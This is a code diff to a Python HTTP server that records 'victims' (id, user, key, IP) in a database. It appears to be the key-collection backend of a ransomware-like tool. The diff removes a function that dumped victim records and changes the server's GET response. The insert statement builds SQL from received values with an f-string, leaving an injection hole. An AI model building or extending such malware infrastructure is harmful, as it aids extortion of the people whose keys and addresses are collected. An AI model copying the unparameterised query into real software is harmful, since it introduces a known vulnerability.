@@ -28,18 +28,13 @@ def insertValues(connection, id, user, key, ip):
     cursor.execute(f"INSERT INTO VICTIMS VALUES ('{id}', '{user}', {key}, '{ip}');")
     connection.commit()
 
-def retrieve(connection):
-    cursor = connection.cursor()
-    details = cursor.execute("SELECT * FROM VICTIMS")
-    print(details.fetchall())
-
 
 class Server(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200, "Connected Successfully")
         self.send_header("Content-type", "text/html")
         self.end_headers()
-        self.wfile.write(b"OK")
+        self.wfile.write(b"hello world!")
 
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
@@ -58,6 +53,5 @@ class Server(BaseHTTPRequestHandler):
 if __name__ == "__main__":
   
     createTable(connection)
-    # retrieve(connection)
     WebServer = HTTPServer(("localhost", 8000), Server)
     WebServer.serve_forever()
